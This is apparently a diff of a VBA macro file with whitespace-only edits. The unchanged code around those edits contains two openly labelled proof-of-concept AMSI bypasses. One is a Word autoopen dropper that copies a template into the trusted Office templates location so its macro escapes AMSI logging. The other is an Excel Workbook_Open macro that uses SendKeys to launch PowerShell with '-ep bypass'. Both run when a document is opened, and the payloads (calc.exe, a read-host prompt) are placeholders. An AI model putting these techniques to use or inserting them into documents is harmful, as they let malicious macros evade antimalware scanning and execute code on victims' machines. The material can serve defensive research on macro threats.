@@ -8,6 +8,7 @@
 ' ##################################################################################
 ' AMSI Bypass approach that abuses trusted locations (sample for Word)  
 ' ##################################################################################
+
 Sub autoopen()
     'function called by the initial 'dropper' code, drops a dotm into %appdata\microsoft templates
     curfile = ActiveDocument.Path & "\" & ActiveDocument.Name
@@ -25,18 +26,18 @@ End Sub
 Sub autonew()
     ' this function is called from a trusted location, not in the AMSI logs
     Shell "calc.exe"
-  End Sub
+End Sub
 
 
 ' ##################################################################################
 ' AMSI Bypass approach that abuses Excel sendkeys to fireup the startmennu 
 ' ##################################################################################
+
 Private Sub Workbook_Open()
     On Error Resume Next
     Application.SendKeys "^{esc}"
     Application.Wait (Now() + TimeValue("00:00:01"))
     Application.SendKeys "powershell.exe -ep bypass read-host ""malicious"" ~"
-
 End Sub
 
 ' ##################################################################################
